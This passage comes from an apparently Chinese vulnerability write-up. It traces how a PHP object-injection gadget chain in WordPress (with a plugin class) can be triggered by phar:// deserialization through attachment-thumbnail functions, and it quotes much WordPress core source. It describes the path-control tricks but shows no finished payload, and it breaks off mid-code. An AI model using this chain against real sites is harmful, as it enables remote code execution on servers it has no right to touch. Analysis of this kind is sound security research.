<span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们找到了一个可以成功触发反序列化的POP链：对Ai1ec_Shutdown_Controller类进行序列化，该类的_preserve变量需要设置为一个Requests_Utility_FilteredIterator类，这个类中的callback与value组合就可以执行任意php函数。</p><h1 id="0x2-Exploit-Chain"><a href="#0x2-Exploit-Chain" class="headerlink" title="0x2  Exploit Chain"></a>0x2  Exploit Chain</h1><p>利用上节中构造的POP链，就可以利用反序列化执行任意php函数，但是接下来还需要找到一个地方可以触发反序列化，在WordPress中直接利用unserialize函数进行反序列化可能性不大，但是WordPress中是可以上传文件的，我们可以上传一个Phar文件，最后利用phar伪协议即可触发POP链。</p><p>最开始我们需要找到一个可以触发伪协议的地方，Phar伪协议的触发需要使用php文件系统函数，如下所示第27行的file_exists函数看起来是一个很好的选择。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve thumbnail for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $post_id Optional. Attachment ID. Default 0.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false False on failure. Thumbnail file path on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_thumb_file</span>(<span class="params"> $post_id = <span class="number">0</span> </span>) </span>&#123;</span><br><span class="line">$post_id = (<span class="keyword">int</span>) $post_id;</span><br><span class="line">$post    = get_post( $post_id );</span><br><span class="line"><span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagedata = wp_get_attachment_metadata( $post-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> ( ! is_array( $imagedata ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = get_attached_file( $post-&gt;ID );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $imagedata[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">$thumbfile = str_replace( basename( $file ), $imagedata[<span class="string">&#x27;thumb&#x27;</span>], $file );</span><br><span class="line"><span class="keyword">if</span> ( file_exists( $thumbfile ) ) &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the attachment thumbnail file path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $thumbfile File path to the attachment thumbnail.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $post_id   Attachment ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> apply_filters( <span class="string">&#x27;wp_get_attachment_thumb_file&#x27;</span>, $thumbfile, $post-&gt;ID );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要使thumbfile的值可控，可以看到thumbfile的值是从file与imagedata来的，再看get_attached_file函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve attached file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By default the path will go through the &#x27;get_attached_file&#x27; filter, but</span></span><br><span class="line"><span class="comment"> * passing a true to the $unfiltered argument of get_attached_file() will</span></span><br><span class="line"><span class="comment"> * return the file path unfiltered.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The function works by getting the single post meta name, named</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; and returning it. This is a convenience function to</span></span><br><span class="line"><span class="comment"> * prevent looking up the meta name and provide a mechanism for sending the</span></span><br><span class="line"><span class="comment"> * attached filename through a filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. Whether to apply filters. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attached_file</span>(<span class="params"> $attachment_id, $unfiltered = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">$file = get_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the file is relative, prepend upload dir.</span></span><br><span class="line"><span class="keyword">if</span> ( $file &amp;&amp; <span class="number">0</span> !== strpos( $file, <span class="string">&#x27;/&#x27;</span> ) &amp;&amp; ! preg_match( <span class="string">&#x27;|^.:\\\|&#x27;</span>, $file ) ) &#123;</span><br><span class="line">$uploads = wp_get_upload_dir();</span><br><span class="line"><span class="keyword">if</span> ( <span class="literal">false</span> === $uploads[<span class="string">&#x27;error&#x27;</span>] ) &#123;</span><br><span class="line">$file = $uploads[<span class="string">&#x27;basedir&#x27;</span>] . <span class="string">&quot;/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $unfiltered ) &#123;</span><br><span class="line"><span class="keyword">return</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the attached file based on the given ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|false $file          The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> apply_filters( <span class="string">&#x27;get_attached_file&#x27;</span>, $file, $attachment_id );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数首先从数据库中_wp_attached_file字段读取附件路径，而_wp_attached_file是我们可以控制的，具体的控制方法会在后文中提到，控制了file以后不能让程序流程进入25行的if中，否则会在file前面拼接上传目录，导致file只能部分可控。</p><p>再看wp_get_attachment_thumb_file函数中完全控制thumbfile的条件是<code>str_replace( basename( $file ), $imagedata[&#39;thumb&#39;], $file )</code>，如果basename(file)和file的值相同，那么该语句就会直接返回imagedata[‘thumb’]，需要注意的是站点运行在Linux上，如果输入的file是一个Windows下的路径例如<code>Z:\Z</code>，就可以满足正则，从而不会进入到if中，而外面的basename就会将其当作一个目录，直接返回file（假如站点运行在Windows上，basename会返回”Z”，Linux下直接返回”Z:\Z”）。</p><p>再看imagedata是怎么来的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves attachment metadata for attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment post ID. Defaults to global $post.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. If true, filters are not run. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Attachment metadata. False on failure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $width      The width of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $height     The height of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $file       The file path relative to `wp-content/uploads`.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $sizes      Keys are size slugs, each value is an array containing</span></span><br><span class="line"><span class="comment"> *                              &#x27;file&#x27;, &#x27;width&#x27;, &#x27;height&#x27;, and &#x27;mime-type&#x27;.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $image_meta Image metadata.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_metadata</span>(<span class="params"> $attachment_id = <span class="number">0</span>, $unfiltered = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">$attachment_id = (<span class="keyword">int</span>) $attachment_id;</span><br><span class="line"></span><br><span class="line">$post = get_post( $attachment_id );</span><br><span class="line"><span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = get_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $unfiltered ) &#123;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the attachment meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|bool $data          Array of meta data for the given attachment, or false</span></span><br><span class="line"><span class="comment"> *                                  if the object does not exist.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int        $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> apply_filters( <span class="string">&#x27;wp_get_attachment_metadata&#x27;</span>, $data, $post-&gt;ID );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到imagedata就是数据库中的_wp_attachment_metadata字段，而该字段也是可控的。在可以完全控制thumbfile以后我们需要找到一个可以调用wp_get_attachment_thumb_file函数的地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scale an image to fit a particular size (such as &#x27;thumb&#x27; or &#x27;medium&#x27;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The URL might be the original image, or it might be a resized version. This</span></span><br><span class="line"><span class="comment"> * function won&#x27;t create a new resized copy, it will just return an already</span></span><br><span class="line"><span class="comment"> * resized one if it exists.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A plugin may use the &#123;<span class="doctag">@see</span> &#x27;image_downsize&#x27;&#125; filter to hook into and offer image</span></span><br><span class="line"><span class="comment"> * resizing services for images. The hook must return an array with the same</span></span><br><span class="line"><span class="comment"> * elements that are normally returned from the function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $id   Attachment ID for image.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|int[] $size Optional. Image size to scale to. Accepts any valid image size name,</span></span><br><span class="line"><span class="comment"> *                           or an array of width and height values in pixels (in that order).</span></span><br><span class="line"><span class="comment"> *                           Default &#x27;medium&#x27;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Array of image data, or boolean false if no image is available.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $0 Image source URL.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $1 Image width in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $2 Image height in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> bool   $3 Whether the image is a resized image.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_downsize</span>(<span class="params"> $id, $size = <span class="string">&#x27;medium&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( $intermediate ) &#123;</span><br><span class="line">$img_url         = str_replace( $img_url_basename, $intermediate[<span class="string">&#x27;file&#x27;</span>], $img_url );</span><br><span class="line">$width           = $intermediate[<span class="string">&#x27;width&#x27;</span>];</span><br><span class="line">$height          = $intermediate[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line">$is_intermediate = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="string">&#x27;thumbnail&#x27;</span> === $size ) &#123;</span><br><span class="line"><span class="comment">// Fall back to the old thumbnail.</span></span><br><span class="line">$thumb_file = wp_get_attachment_thumb_file( $id );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>image_downsize函数的作用就是将一个附件转换为不同尺寸的缩略图，如果size是thumbnail的话就可以直接调用wp_get_attachment_thumb_file，那么再看有没有什么地方调用了image_downsize函数，并且size是thumbnail。由于WordPress的媒体页面中可以很明显看到提供了多种尺寸的附件缩略图，所以肯定可以找到满足要求的调用点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML for the size radio buttons with the specified one checked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.7.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post     $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool|string $check</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_size_input_fields</span>(<span class="params"> $post, $check = <span class="string">&#x27;&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $size_names = apply_filters(</span><br><span class="line"><span class="string">&#x27;image_size_names_choose&#x27;</span>,</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;thumbnail&#x27;</span> =&gt; __( <span class="string">&#x27;Thumbnail&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;medium&#x27;</span>    =&gt; __( <span class="string">&#x27;Medium&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;large&#x27;</span>     =&gt; __( <span class="string">&#x27;Large&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;full&#x27;</span>      =&gt; __( <span class="string">&#x27;Full Size&#x27;</span> ),</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">foreach</span> ( $size_names <span class="keyword">as</span> $size =&gt; $label ) &#123;</span><br><span class="line">$downsize = image_downsize( $post-&gt;ID, $size );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $html = <span class="string">&quot;&lt;div class=&#x27;image-size-item&#x27;&gt;&lt;input type=&#x27;radio&#x27; &quot;</span> . disabled( $enabled, <span class="literal">false</span>, <span class="literal">false</span> ) . <span class="string">&quot;name=&#x27;attachments[<span class="subst">$post</span>-&gt;ID][image-size]&#x27; id=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27; value=&#x27;<span class="subst">&#123;$size&#125;</span>&#x27;<span class="subst">$checked</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$html .= <span class="string">&quot;&lt;label for=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27;&gt;<span class="subst">$label</span>&lt;/label&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Size&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;html&#x27;</span>  =&gt; join( <span class="string">&quot;\n&quot;</span>, $out ),</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在foreach中对每一个size进行遍历，而size_names中刚好有thumbnail，可以成功触发image_downsize。通过分析函数，可以看到该函数的作用是构造HTML表单，那么很幸运，即然这个函数要输出HTML，可以通过接口调用该函数的可能性就更大了，再找一找哪里可以触发该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves the attachment fields to edit form fields.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array   $errors</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attachment_fields_to_edit</span>(<span class="params"> $post, $errors = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// This was formerly in image_attachment_fields_to_edit().</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="string">&#x27;image&#x27;</span> === substr( $post-&gt;post_mime_type, <span class="number">0</span>, <span class="number">5</span> ) ) &#123;</span><br><span class="line">$alt = get_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $alt ) ) &#123;</span><br><span class="line">$alt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$form_fields[<span class="string">&#x27;post_title&#x27;</span>][<span class="string">&#x27;required&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">$form_fields[<span class="string">&#x27;image_alt&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;value&#x27;</span> =&gt; $alt,</span><br><span class="line"><span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Alternative Text&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;helps&#x27;</span> =&gt; __( <span class="string">&#x27;Alt text for the image, e.g. &amp;#8220;The Mona Lisa&amp;#8221;&#x27;</span> ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$form_fields[<span class="string">&#x27;align&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Alignment&#x27;</span> ),</span><br><span class="line"><span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;html&#x27;</span>  =&gt; image_align_input_fields( $post, get_option( <span class="string">&#x27;image_default_align&#x27;</span> ) ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$form_fields[<span class="string">&#x27;image-size&#x27;</span>] = image_size_input_fields( $post, get_option( <span class="string">&#x27;image_default_size&#x27;</span>, <span class="string">&#x27;medium&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">unset</span>( $form_fields[<span class="string">&#x27;image_alt&#x27;</span>] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filters the attachment fields to edit.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array   $form_fields An array of attachment form fields.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post $post        The WP_Post attachment object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$form_fields = apply_filters( <span class="string">&#x27;attachment_fields_to_edit&#x27;</span>, $form_fields, $post );</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $form_fields;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第35行<code>$form_fields[&#39;image-size&#39;] = image_size_input_fields( $post, get_option( &#39;image_default_size&#39;, &#39;medium&#39; ) );</code>调用了该函数，而进入该if分支的条件是<code>&#39;image&#39; === substr( $post-&gt;post_mime_type, 0, 5 )</code>，只要我们上传的文件mime是image就可以进入分支，那么再找找哪里调用了get_attachment_fields_to_edit。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span 